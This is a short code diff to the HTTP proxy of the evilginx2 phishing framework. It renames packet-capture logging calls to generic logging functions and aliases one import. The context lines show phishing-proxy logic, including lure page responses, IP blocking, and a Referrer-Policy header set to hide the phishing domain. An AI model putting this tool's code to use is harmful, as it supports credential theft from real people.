@@ -34,7 +34,7 @@ import (
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
-	"github.com/mwitkow/go-http-dialer"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -140,7 +140,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			hiblue := color.New(color.FgHiBlue)
 
 			//send to pcaplogger
-			PCAPrequest(req)
+			LogRequest(req)
 
 			// handle ip blacklist
 			from_ip := req.RemoteAddr
@@ -354,7 +354,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
-												PCAPresponse(resp) //send to pcaplogger
+												LogResponse(resp) //send to pcaplogger
 												return req, resp
 											} else {
 												log.Error("lure: failed to create html template response")
@@ -382,7 +382,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 						if resp != nil {
 							resp.Header.Add("Location", rurl)
-							PCAPresponse(resp) //send to pcaplogger
+							LogResponse(resp) //send to pcaplogger
 							return req, resp
 						}
 					}
@@ -394,7 +394,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
 					if resp != nil {
-						PCAPresponse(resp) //send to pcaplogger
+						LogResponse(resp) //send to pcaplogger
 						return req, resp
 					}
 				}
@@ -904,7 +904,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								// avoid leaking the phishing domain via the Referrer header
 								resp.Header.Set("Referrer-Policy", "no-referrer")
 								resp.Header.Set("Location", s.RedirectURL)
-								PCAPresponse(resp) //send to pcaplogger
+								LogResponse(resp) //send to pcaplogger
 								return resp
 							}
 						}
@@ -912,7 +912,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			PCAPresponse(resp) //send to pcaplogger
+			LogResponse(resp) //send to pcaplogger
 			return resp
 		})
 
@@ -930,17 +930,17 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
 		if resp != nil {
 			resp.Header.Add("Location", redirect_url)
-			PCAPdual(req, resp) //send to pcaplogger
+			LogDual(req, resp) //send to pcaplogger
 			return req, resp
 		}
 	} else {
 		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
 		if resp != nil {
-			PCAPdual(req, resp) //send to pcaplogger
+			LogDual(req, resp) //send to pcaplogger
 			return req, resp
 		}
 	}
-	PCAPrequest(req) //send to pcaplogger
+	LogRequest(req) //send to pcaplogger
 	return req, nil
 }
 
